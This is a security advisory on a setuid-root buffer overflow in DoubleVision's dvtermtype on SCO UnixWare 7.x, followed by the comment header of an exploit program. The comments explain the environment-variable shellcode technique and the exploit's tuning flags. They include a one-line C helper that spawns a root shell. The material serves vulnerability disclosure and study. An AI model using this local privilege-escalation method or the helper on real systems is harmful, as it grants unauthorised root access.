A utility integral to Tridia DoubleVision for SCO UnixWare 7.x has been found to be vulnerable to a buffer overflow attack.

dvtermtype, which is setuid root, is run by a user at login time to tell DoubleVision what terminal translations to use. The command line parameters are as follows:

$ dvtermtype termtype devicename

If a malicious user contructs a long termtype string and executes dvtermtype, dvtermtype will stack overflow. This can lead to a root compromise.

Tridia has different release schedules for each UNIX platform is supports. It is unclear what other UNIX builds of DoubleVision are vulnerable.

 *
 *      This program exploits the "Double Vision" system on SCO
 *      Unixware 7.1.0 via a buffer overflow on the "dvtermtype"
 *      program. Double Vision is like a "pcAnywhere for UNIX",
 *      but quite a few programs in this distribution are setuid
 *      root. The problem is that these programs were not written
 *      with security in mind, and it's not clear that they even
 *      need to be setuid root.
 *
 *      This particular program exploits "dvtermtype" by passing a
 *      very long second parameter that overflows some internal
 *      buffer. This buffer is filled with a predicted address
 *      of the shellcode, and the shellcode itself is stored in
 *      a very long environment variable. This approach makes
 *      the shellcode much easier to find.
 *
 *      This shellcode was based directly on the great work of
 *      Brock Tellier (btellier@usa.net), who seems to spend a lot
 *      of time within with various SCO UNIX release. Thanks!
 *
 *      This shellcode runs /tmp/ui, which should be this simple
 *      program:
 *
 *      $ cd /tmp
 *      $ cat ui.c
 *      int main() { setreuid(0,0); system("/bin/sh"); return 0; }
 *      $ cc ui.c -o ui
 *
 *      Brock's original work compiled this automatically, but I
 *      prefer to do it by hand. A better approach is to do the
 *      setreuid() in the shellcode and call /bin/sh directly.
 *      Maybe another day.

 * TUNING
 * ------
 *
 *      The default parameters to this program work on the versions mentioned
 *      above, but for variants some tuning might be required. There are three
 *      parameters that guide this program's operation:
 *
 *      -a retaddr      set the "return" address to the given hex value,
 *                      which is the address where we expect to find the
 *                      exploit code in the environment. The environment
 *                      is at a relatively fixed location just below
 *                      0x80000000, so getting "close" is usually sufficient.
 *                      Note that this address cannot have any zero bytes
 *                      in it! We believe that the target code has enough
 *                      padding NOP values to make it an easy target.
 *
 *      -r retlen       length of the overflowed "return address" buffer,
 *                      which is filled in with the address provided above.
 *                      Default = 2k, max = 5k.
 *
 *      -l n            slightly shift the alignment of the return address
 *                      buffer by 1, 2 or 3 in case the buffer that's being
 *                      overflowed.
